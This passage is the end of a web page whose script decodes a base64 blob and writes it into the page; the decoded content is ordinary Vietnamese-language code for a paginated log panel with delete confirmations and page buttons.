CAgYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKA0KICAgICAgJ+KdjCDDiiBsw6BtIGPDoWkgZ8OsIMSR4bqleXl5eSBlbSDGoWkuIDxici8+ROG7q25nIGzhuqFpIG5nYXksIHF1w6Egbmd1eSBoaeG7g20uJywNCiAgICAgIHRydWUgLy8gPC0tIGNo4bq/IMSR4buZIDEgbsO6dA0KICAgICk7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgLy8gTuG6v3UgbMOgIGRvY3RvciDihpIgcG9wdXAgeMOhYyBuaOG6rW4geG/DoSAoMiBuw7p0KQ0KICBjb25zdCBvayA9IGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgNCiAgICAnQuG6oW4gY8OzIGNo4bqvYyBtdeG7kW4geG/DoSBt4bulYyBuw6B5PycsDQogICAgZmFsc2UNCiAgKTsNCiAgaWYgKCFvaykgcmV0dXJuOw0KDQogIHRyeSB7DQogICAgYXdhaXQgZGVsZXRlTG9nQW5kRmlsZV9CeUluZGV4KGluZGV4SW5Mb2dzKTsNCiAgICBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoJ+KchSDEkMOjIHhvw6EgdGjDoG5oIGPDtG5nIScsIHRydWUpOw0KICAgIGF3YWl0IHNob3dEcm9wYm94UGFuZWwoKTsNCiAgfSBjYXRjaCAoZSkgew0KICAgIGNvbnNvbGUuZXJyb3IoZSk7DQogICAgYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKCfimqDvuI8gQ8OzIGzhu5dpIGtoaSB4b8OhLiBWdWkgbMOybmcgdGjhu60gbOG6oWkuJywgdHJ1ZSk7DQogIH0NCn0NCg0KLy8gxJDDs25nIHBhbmVsIGtoaSBi4bqlbSBFU0MgaG/hurdjIGNsaWNrIHJhIG5nb8OgaQ0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGUpIHsNCiAgaWYgKGUua2V5ID09PSAiRXNjYXBlIikgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkcm9wYm94UGFuZWwiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICB9DQp9KTsNCg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihlKSB7DQogIGNvbnN0IHBhbmVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRyb3Bib3hQYW5lbCIpOw0KICBpZiAocGFuZWwuc3R5bGUuZGlzcGxheSA9PT0gImJsb2NrIiB8fCBwYW5lbC5zdHlsZS5kaXNwbGF5ID09PSAiZmxleCIpIHsNCiAgICBjb25zdCBjb250ZW50ID0gcGFuZWwucXVlcnlTZWxlY3RvcigiZGl2Iik7DQogICAgLy8gTuG6v3UgY2xpY2sgbmdvw6BpIHbDuW5nIG7hu5lpIGR1bmcgcGFuZWwNCiAgICBpZiAoIWNvbnRlbnQuY29udGFpbnMoZS50YXJnZXQpKSB7DQogICAgICBwYW5lbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIH0NCiAgfQ0KfSk7DQoNCjwvc2NyaXB0Pg0KPHNjcmlwdD4NCi8vID09PT09PSBQSMOCTiBUUkFORyBC4bqiTkcgTE9HIFRST05HIFBPUFVQID09PT09PQ0KbGV0IERCX0xPR1MgPSBbXTsgICAgICAgLy8gdG/DoG4gYuG7mSBsb2dzIMSRw6MgdOG6o2kNCmxldCBEQl9QQUdFID0gMTsgICAgICAgIC8vIHRyYW5nIGhp4buHbiB04bqhaQ0KbGV0IERCX1BBR0VfU0laRSA9IDEwOyAgLy8gc+G7kSBkw7JuZyAvIHRyYW5nDQpsZXQgREJfQ1VSUkVOVF9VU0VSID0gJyc7IC8vIHVzZXIgxJFhbmcgxJHEg25nIG5o4bqtcCAobG93ZXJjYXNlKSDEkeG7gyByZW5kZXIgbsO6dCBYb8OhDQoNCmZ1bmN0aW9uIHNldFBhZ2VTaXplKHNpemUpew0KICBEQl9QQUdFX1NJWkUgPSBOdW1iZXIoc2l6ZSkgfHwgMTA7DQogIERCX1BBR0UgPSAxOw0KICByZW5kZXJEcm9wYm94UGFnZSgpOw0KfQ0KDQpmdW5jdGlvbiBnb1RvUGFnZShwKXsNCiAgY29uc3QgbWF4ID0gTWF0aC5tYXgoMSwgTWF0aC5jZWlsKERCX0xPR1MubGVuZ3RoIC8gREJfUEFHRV9TSVpFKSk7DQogIERCX1BBR0UgPSBNYXRoLm1pbihNYXRoLm1heCgxLCBwKSwgbWF4KTsNCiAgcmVuZGVyRHJvcGJveFBhZ2UoKTsNCn0NCg0KZnVuY3Rpb24gcmVuZGVyRHJvcGJveFBhZ2UoKXsNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveEZpbGVMaXN0Jyk7DQogIGNvbnN0IHBhZ2VCdG5zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlQnV0dG9ucycpOw0KICBjb25zdCBwYWdlSW5mbyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZUluZm8nKTsNCg0KICBpZighdGJvZHkpIHJldHVybjsNCg0KICAvLyBy4buXbmc/DQogIGlmKCFBcnJheS5pc0FycmF5KERCX0xPR1MpIHx8IERCX0xPR1MubGVuZ3RoID09PSAwKXsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7Y29sb3I6cmVkIj5LaMO0bmcgY8OzIGRhbmggc8OhY2ggbsOgbyDEkcaw4bujYyBsxrB1PC90ZD48L3RyPmA7DQogICAgaWYocGFnZUJ0bnMpIHBhZ2VCdG5zLmlubmVySFRNTCA9ICcnOw0KICAgIGlmKHBhZ2VJbmZvKSBwYWdlSW5mby50ZXh0Q29udGVudCA9ICcnOw0KICAgIHJldHVybjsNCiAgfQ0KDQogIGNvbnN0IHRvdGFsID0gREJfTE9HUy5sZW5ndGg7DQogIGNvbnN0IG1heFBhZ2UgPSBNYXRoLm1heCgxLCBNYXRoLmNlaWwodG90YWwgLyBEQl9QQUdFX1NJWkUpKTsNCiAgaWYoREJfUEFHRSA+IG1heFBhZ2UpIERCX1BBR0UgPSBtYXhQYWdlOw0KDQogIGNvbnN0IHN0YXJ0SWR4ID0gKERCX1BBR0UgLSAxKSAqIERCX1BBR0VfU0laRTsNCiAgY29uc3QgZW5kSWR4ICAgPSBNYXRoLm1pbihzdGFydElkeCArIERCX1BBR0VfU0laRSwgdG90YWwpOw0KICBjb25zdCBzbGljZSAgICA9IERCX0xPR1Muc2xpY2Uoc3RhcnRJZHgsIGVuZElkeCk7DQoNCiAgLy8gUmVuZGVyIGJvZHkgdGhlbyB0cmFuZw0KICB0Ym9keS5pbm5lckhUTUwgPSBzbGljZS5tYXAoKGl0ZW0sIGkpID0+IGANCiAgICA8dHI+DQogICAgICA8dGQ+JHtzdGFydElkeCArIGkgKyAxfTwvdGQ+DQogICAgICA8dGQ+JHtpdGVtLmtob2EgfHwgJyd9PC90ZD4NCiAgICAgIDx0ZD4keyhpdGVtLm5nYXkgfHwgJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcwMDowMDowMCcsJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcyMzo1OTo1OScsJycpDQogICAgICAgICAgIC5yZXBsYWNlKCdU4burJywnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJ8SR4bq/bicsJyAtPiAnKQ0KICAgICAgICAgICAucmVwbGFjZSgvXHMrL2csJyAnKQ0KICAgICAgICAgICAudHJpbSgpfTwvdGQ+DQoJCSAgIA0KCQkgICA8dGQ+JHtOdW1iZXIoaXRlbS5oZXJiX2Vycm9ycyB8fCAwKX08L3RkPg0KICAgICA8dGQ+JHtOdW1iZXIoaXRlbS50aW1lX2Vycm9ycyB8fCAwKX08L3RkPg0KICAgIDx0ZD4ke051bWJlcihpdGVtLmNvbmZsaWN0X2Vycm9ycyB8fCAwKX08L3RkPg0KCQkgICANCiAgICAgIDx0ZD4keyhpdGVtLnRpbWUgfHwgJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcsJywgJycpDQogICAgICAgICAgIC5yZXBsYWNlKCcgJywgJyAtICcpDQogICAgICAgICAgIC5yZXBsYWNlKC9ccysvZywgJyAnKQ0KICAgICAgICAgICAudHJpbSgpfTwvdGQ+DQogICAgICA8dGQ+PGEgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBvbmNsaWNrPSJ2ZXJpZnlBbmRPcGVuTGluaygnJHtpdGVtLmxpbmt9JykiPlhlbTwvYT48L3RkPg0KICAgICAgPHRkPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIHN0eWxlPSJiYWNrZ3JvdW5kOiNlNzRjM2M7IHBhZGRpbmc6MTBweCAxNHB4OyBmb250LXNpemU6MTJweDsiDQogICAgICAgICAgb25jbGljaz0ib25EZWxldGVMb2dSb3coJHtzdGFydElkeCArIGl9LCAnJHtEQl9DVVJSRU5UX1VTRVJ9JykiPg0KICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS10cmFzaCI+PC9pPiBYb8OhDQogICAgICAgIDwvYnV0dG9uPg0KICAgICAgPC90ZD4NCiAgICA8L3RyPg0KICBgKS5qb2luKCcnKTsNCg0KICAvLyBSZW5kZXIgbsO6dCB0cmFuZyAoUHJldiDigKYgTmV4dCkg4oCUIGhp4buDbiB0aOG7iyBk4bqjaSB04buRaSDEkWEgNyBuw7p0IHPhu5ENCiAgaWYocGFnZUJ0bnMpew0KICAgIGNvbnN0IGJ0biA9IChsYWJlbCwgdGFyZ2V0LCBkaXNhYmxlZD1mYWxzZSwgdGl0bGU9JycpID0+DQogICAgICBgPGJ1dHRvbiBjbGFzcz0iYnRuIiAke2Rpc2FibGVkPydkaXNhYmxlZCc6Jyd9IHRpdGxlPSIke3RpdGxlfSINCiAgICAgICAgICAgICAgIHN0eWxlPSJwYWRkaW5nOjZweCAxMHB4JHtkaXNhYmxlZD8nO29wYWNpdHk6LjY7Y3Vyc29yOm5vdC1hbGxvd2VkJzonJ30iDQogICAgICAgICAgICAgICBvbmNsaWNrPSJnb1RvUGFnZSgke3RhcmdldH0pIj4ke2xhYmVsfTwvYnV0dG9uPmA7DQoNCiAgICBjb25zdCByYW5nZSA9IDM7IC8vIGhhaSBiw6puIHRyYW5nIGhp4buHbiB04bqhaQ0KICAgIGNvbnN0IGZyb20gID0gTWF0aC5tYXgoMSwgREJfUEFHRSAtIHJhbmdlKTsNCiAgICBjb25zdCB0byAgICA9IE1hdGgubWluKG1heFBhZ2UsIERCX1BBR0UgKyByYW5nZSk7DQoNCiAgICBsZXQgaHRtbCA9ICcnOw0KICAgIGh0bWwgKz0gYnRuKCfCqyDEkOG6p3UnLCAxLCBEQl9QQUdFPT09MSwgJ1RyYW5nIMSR4bqndScpOw0KICAgIGh0bWwgKz0gYnRuKCfigLkgVHLGsOG7m2MnLCBEQl9QQUdFLTEsIERCX1BBR0U9PT0xLCAnVHJhbmcgdHLGsOG7m2MnKTsNCiAgICBmb3IobGV0IHAgPSBmcm9tOyBwIDw9IHRvOyBwKyspew0KICAgICAgaHRtbCArPSBgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJnb1RvUGFnZSgke3B9KSINCiAgICAgICAgICAgICAgICAgc3R5bGU9InBhZGRpbmc6NnB4IDEwcHg7JHtwPT09REJfUEFHRT8nYmFja2dyb3VuZDojMmVjYzcxJzonJ30iPg0KICAgICAgICAgICAgICAgICAke3B9DQogICAgICAgICAgICAgICA8L2J1dHRvbj5gOw0KICAgIH0NCiAgICBodG1sICs9IGJ0bignU2F1IOKAuicsIERCX1BBR0UrMSwgREJfUEFHRT09PW1heFBhZ2UsICdUcmFuZyBzYXUnKTsNCiAgICBodG1sICs9IGJ0bignQ3Xhu5FpIMK7JywgbWF4UGFnZSwgREJfUEFHRT09PW1heFBhZ2UsICdUcmFuZyBjdeG7kWknKTsNCg0KICAgIHBhZ2VCdG5zLmlubmVySFRNTCA9IGh0bWw7DQogIH0NCg0KICBpZihwYWdlSW5mbyl7DQogICAgcGFnZUluZm8udGV4dENvbnRlbnQgPSBgVHJhbmcgJHtEQl9QQUdFfS8ke21heFBhZ2V9IOKAoiAke3N0YXJ0SWR4KzF9LSR7ZW5kSWR4fS8ke3RvdGFsfWA7DQogIH0NCn0NCg0KLy8gR+G6r24gc+G7sSBraeG7h24gxJHhu5VpIHBhZ2Ugc2l6ZSAoY2jhu4kgY+G6p24gZ+G7jWkgMSBs4bqnbiBzYXUga2hpIHBvcHVwIG3hu58pDQpmdW5jdGlvbiBhdHRhY2hQYWdlckV2ZW50c09uY2UoKXsNCiAgY29uc3Qgc2VsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlU2l6ZScpOw0KICBpZihzZWwgJiYgIXNlbC5kYXRhc2V0LmJvdW5kKXsNCiAgICBzZWwuZGF0YXNldC5ib3VuZCA9ICcxJzsNCiAgICBzZWwuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZSA9PiBzZXRQYWdlU2l6ZShlLnRhcmdldC52YWx1ZSkpOw0KICB9DQp9DQo8L3NjcmlwdD4NCjwvYm9keT4NCg0KPC9odG1sPg==";
  const binary = atob(base64);
  const bytes = new Uint8Array([...binary].map(c => c.charCodeAt(0)));
  const decoded = new TextDecoder("utf-8").decode(bytes);
  document.write(decoded);
</script>


</body>
</html>
